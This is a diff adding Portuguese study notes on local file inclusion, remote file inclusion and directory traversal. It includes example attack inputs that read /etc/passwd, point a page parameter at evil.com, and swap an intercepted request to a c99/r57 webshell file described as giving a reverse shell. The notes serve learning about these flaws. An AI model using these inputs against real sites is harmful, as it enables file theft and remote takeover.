@@ -1,0 +1,40 @@
+LFI (Local File Inclusion) ***
+
+-> É uma vulnerabilidade em que o atacante é capaz de incluir arquivos locais do servidor web
+-> isto é, ele é capaz de acessar pastas/arquivos que guarda infos. confidenciais da aplicação apenas explorando essa vulnerabilidade
+da url, colocando caminhos que resultariam no que ele busca achar
+    -> isto vem do fato de que o servidor usa o parametro page com arquivos locais para representar o que deve ser renderizado
+-> por exemplo (caso mais comum):
+
+1) uma aplicação vai renderizar uma pagina na url example.com/index.php?page=2
+2) o usuario malicioso se aproveita desse "page" e coloca a url example.com/index.php?page=/etc/passwd
+    -> assim, é renderizado na tela nomes de usuarios e senhas criptografadas
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+RFI (Remote File Inclusion) ***
+
+-> Parecido com o LFI, mas o que é passado no parametro page seria o link de outro site (isso por que, por algum motivo, a intençao
+do page= seria renderizar outra aplicação)
+-> Se a aplicação não validar corretamente o parâmetro "page", o invador pode injetar um URL malicioso que inclui um arquivo remoto de um servidores
+-> ex: example.com/index.php?page=http://evil.com/malicious/php
+
+1) alguns servidores, ao inves de lerem arquivos com o metodo GET (ou seja, atraves da url), eles leem atraves do POST (ou seja,
+você clica em algo que é renderizado na pagina, mas de outro servidor, ou seja, que nao faz parte do conjunto de arquivos daquele server)
+2) portanto, como burp suite, basta interceptar a requisiçao/resposta e manipular o payload que manda praquele url
+    -> ou seja, vamos supor que uma pagina quer renderizar algo de outra url e aí voce clica num botao e é feita uma requisiçao ate essa pagina x do servidor y
+    -> isso quer dizer que, em algum lugar do header de requisiçao, existe um payload que guarda a url que vai ser acessada
+    -> basta usar o burp suite como proxy para interceptar essa requisição, mudar o payload para a url maliciosa que voce de fato quer, e carregar a pag
+
+ex: payload -> textfile=http%3A%2F%2Fwww.textfiles.comblablabla&text-file-viewer-php-submit-button=View+File
+    => intercepta e muda o textfile= para algo
+    => por ex: www.c99shellphp.com/shellr57.txt
+        -> é o caminho de um arquivo txt que aplica uma shell reversa caso consiga ser aplicado dentro do servidor
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+DIRECTORY TRAVERSAL ***
+
+-> É uma vulnerabilidade que permite que um invasor acesse arquivos e diretórios fora da raiz do aplicativo web.
+-> mesma lígica do LFI, mas, desta vez, o invasor usa um parametro mais distante de coisas superficiais
+ex: example.com/image.php?file=../../../etc/passwd
